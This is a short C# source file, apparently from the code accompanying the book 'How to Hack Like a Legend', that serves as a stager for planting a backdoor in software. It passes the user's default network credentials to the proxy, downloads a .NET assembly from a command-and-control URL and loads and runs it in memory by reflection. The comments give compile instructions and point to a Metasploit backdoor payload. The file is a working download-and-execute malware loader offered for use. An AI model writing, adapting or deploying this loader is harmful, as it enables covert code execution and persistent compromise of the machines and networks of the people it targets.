using System;
using System.Net;
using System.Reflection;

/*
Wrapper to download .NET executable, store it in a variable and execute its main function.
The .Net assembly, can be produced by msf_backdoor.cs in the repo for instance.
No need to mention the ".exe" extension in the filename. It is arbitrary.

Code used in How to Hack Like a Legend book to plant a backdoor in a software

To compile:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /out:hello.exe .\wrapper_assembly.cs

PS:  Change line 35 to reflect the namespace and class used in the program
PPS: Change line 36 if you want to call another method other than main.

@SparcFlow
*/

namespace wrapper
{
	class Program
	{
		static void Main(string[] args)
        {
		   System.Net.WebRequest.DefaultWebProxy.Credentials = System.Net.CredentialCache.DefaultNetworkCredentials; 
		   //classic webclient object to download data
		   WebClient myWebClient = new WebClient();

		   //Download bytes from C2 domain
		   byte[] myDataBuffer = myWebClient.DownloadData("<full_url_to_NET_executable>");

		   //Reflectively load it in memory
		   Assembly a = Assembly.Load(myDataBuffer);
		   Type t = a.GetType("shellcode.Program");
		   MethodInfo staticMethodInfo = t.GetMethod("Main");
			
		   staticMethodInfo.Invoke(null,null);
		}
	}
}
